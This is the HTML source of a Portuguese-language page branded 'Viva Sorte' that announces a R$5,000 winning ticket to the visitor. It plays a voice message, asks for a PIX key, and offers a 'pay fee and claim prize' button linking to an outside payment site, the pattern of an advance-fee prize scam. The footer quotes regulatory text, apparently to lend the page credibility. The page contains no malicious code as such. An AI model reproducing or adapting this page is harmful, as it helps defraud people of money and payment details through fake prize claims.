<!doctype html>
<html lang="pt-BR">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Viva Sorte</title>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>

    <link href="css/obrigado-premiado.css@v=7000" rel="stylesheet">

    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&display=swap"
        rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-rbsA2VBKQhggwzxH7pPCaAqO46MgnOM80zW1RWuH61DGLwZJEdK2Kadq2F9CUG65" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
</head>

<style>.escondeer { display: none; } .esconder-btn { display: none; } </style>

  

  

    <!-- Meta Pixel Code -->
    <script>
    !function(f,b,e,v,n,t,s)
    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
    n.queue=[];t=b.createElement(e);t.async=!0;
    t.src=v;s=b.getElementsByTagName(e)[0];
    s.parentNode.insertBefore(t,s)}(window, document,'script',
    'https://connect.facebook.net/en_US/fbevents.js');
    fbq('init', '774564267570472');
    fbq('track', 'PageView');
    </script>
    <noscript><img height="1" width="1" style="display:none"
    src="https://www.facebook.com/tr?id=774564267570472&ev=PageView&noscript=1"
    /></noscript>
    <!-- End Meta Pixel Code -->
  


<head>
  <link href="css/topo.css@v=1234256" rel="stylesheet">
</head>


<div class="topo">
    <img src="img/logo.svg">
</div>

  

<div class="container-principal">

<h1 class="voce-achou">VOCÊ ACHOU!</h1>

<div class="base-cupom">
		    <div class="coupon rounded mb-3 d-flex justify-content-between">
                <div class="p-3 tengah py-3 d-flex flex-column w-75 justify-content-center align-items-center">
                <span class="bilhete-premiado">SEU BILHETE É PREMIADO!</span>
                <span class="valor-premio">VALOR DO PRÊMIO:</span>
                <span class="valor-premio-dinheiro">R$5.000,00</span>
                </div>
                <div class="kanan d-flex flex-column justify-content-center align-items-center">
                    <div class="info d-flex flex-column justify-content-center align-items-center">
                    <span class="numero-bilhete">8541256</span>
                    </div>
                </div>
            </div>
</div>


<h1 class="assista-video">ESCUTE O ÁUDIO ABAIXO PARA RESGATAR SEU PRÊMIO:</h1>

 <style>
    .audio-whats {
        background-color: #005246;
        padding: 1rem 0.8rem 0.4rem 0.8rem;
        border-radius: 0.4rem;
    }

    .audio-whats-image {
        width: 3.4rem;
    }

    .audio-whats-image img {
        width: 100%;
        border-radius: 50%;
    }

    .audio-whats-play i {
        color: white;
        font-size: 2.2rem;
        margin-left: -0.2rem;
    }

    .audio-whats-line {
        background-color: #ccc;
        height: 3px;
        width: 100%;
        position: relative;
    }

    .audio-whats-progress {
        position: absolute;
        top: 0;
        left: 0;
        height: 100%;
        background-color: #52b52f; 
        width: 0; 
    }

    H1.player-minuto {
        color: white;
        font-size: 0.8rem;
        margin-top: -6px;
    }

</style>

<div class="audio-whats d-flex">

    <div class="audio-whats-image">
        <img src="img/perfil.jpg">
    </div>

    <div class="d-flex flex-column justify-content-between w-100" style="margin-left: 0.5rem;">
        <div class="d-flex align-items-center">
            <span class="audio-whats-play" onclick="togglePlay()"><i class="bi bi-play-fill"></i></span>
            <div class="audio-whats-line">
                <div class="audio-whats-progress"></div> <!-- Barra de progresso dinâmica -->
            </div>
        </div>
        <h1 class="player-minuto">01:13</h1> 
    </div>

</div>

<audio id="audio" src="../img/correto37.mp3"></audio>

<script>
    const audio = document.getElementById('audio');
    const progressBar = document.querySelector('.audio-whats-progress');

    function togglePlay() {
        if (audio.paused) {
            audio.play();
            animateBall();
        } else {
            audio.pause();
            stopAnimation();
        }
    }

    function animateBall() {
        const duration = audio.duration * 1000;
        const line = document.querySelector('.audio-whats-line');

        progressBar.style.width = '0'; 

 
        line.style.animation = `lineProgress linear ${duration}ms forwards`;

 
        const intervalId = setInterval(() => {
            const progress = (audio.currentTime / audio.duration) * 100;
            progressBar.style.width = `${progress}%`;
            if (audio.paused || audio.ended) {
                clearInterval(intervalId);
            }
        }, 100);
    }

    function stopAnimation() {
        const line = document.querySelector('.audio-whats-line');
        line.style.animation = 'none';
    }

    function togglePlay() {
    const playButton = document.querySelector('.audio-whats-play i');

    if (audio.paused) {
        audio.play();
        animateBall();
        playButton.classList.remove('bi-play-fill');
        playButton.classList.add('bi-pause-fill');
    } else {
        audio.pause();
        stopAnimation();
        playButton.classList.remove('bi-pause-fill');
        playButton.classList.add('bi-play-fill');
    }
}

audio.addEventListener('ended', function() {
    const playButton = document.querySelector('.audio-whats-play i');
    playButton.classList.remove('bi-pause-fill');
    playButton.classList.add('bi-play-fill');
});


</script>

<h1 class="assista-video-novo esconder">INSIRA SUA CHAVE PIX PARA RESGATAR O PRÊMIO:</h1>
        <input id="cpf" name="cpf" class="dados-form-input esconder" type="text" placeholder="Chave PIX" required>
        <a href="https://pay.seustitulosvivasorte.com/q510ZOYmb54gE9D"><button type="submit" id="btn-submit" class="adc-carrinho esconder" disabled><i class="bi bi-check"></i>PAGAR TAXA E RESGATAR PRÊMIO!</button></a>
</button>
   
</div>




    </div>

    <head>
  <link href="css/rodape.css@v=1234256" rel="stylesheet">
</head>

<div class="rodape">
    <div class="container-principal">
        <img class="logo-rodape" src="img/logo.png"/>

        <div class="redes">
            <i class="bi bi-instagram"></i>
            <i class="bi bi-facebook"></i>
            <i class="bi bi-twitter"></i>
            <i class="bi bi-youtube"></i>
        </div>

        <h1>Sorteios lastreados por Títulos de Capitalização, da Modalidade Incentivo, emitidos pela VIA Capitalização S.A, inscrita no CNPJ sob nº 88.076.302/0001-94, e aprovados pela SUSEP através do registro na SUSEP Sorteio n° 15414.652257/2023-51. O valor das premiações aqui indicados são líquidos, já descontado o devido imposto de renda de 25%. O registro deste plano na SUSEP não implica, por parte da Autarquia, incentivo ou recomendação a sua comercialização.</h1>
        
        <div class="linha-rodape"></div>

        <div class="patterns-rodape">
            <div class="pattern-rodape">
                Títulos emitidos por:
                <img src="img/viacap.png"/>
            </div>

            <div class="pattern-rodape">
                Promoção realizada por:
                <img src="img/viva.png"/>
            </div>

            <div class="pattern-rodape">
                Desenvolvimento:
                <img src="img/edjdigital.png"/>
            </div>
        </div>
    </div>
</div>


   
<script>
        document.addEventListener("DOMContentLoaded", function () {
            const inputCPF = document.getElementById('cpf');
            const btnSubmit = document.getElementById('btn-submit');
            const divEsconderBtn = document.querySelector('.esconder-btn');

            inputCPF.addEventListener('input', function () {
                if (inputCPF.value.trim() !== '') {
                    btnSubmit.disabled = false;
                } else {
                    btnSubmit.disabled = true; 
                }
            });

        });
    </script>


<script src="js/confetti.min.js"></script>
<script>confetti.start()</script>
<script>setTimeout(function(){confetti.stop();},8000)</script>




    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-kenU1KFdBIe4zVF0s0G1M5b4hcpxyD9F7jL+jjXkk+Q2h455rYXK/7HAuoJl+0I4"
        crossorigin="anonymous"></script>

</body>

</html>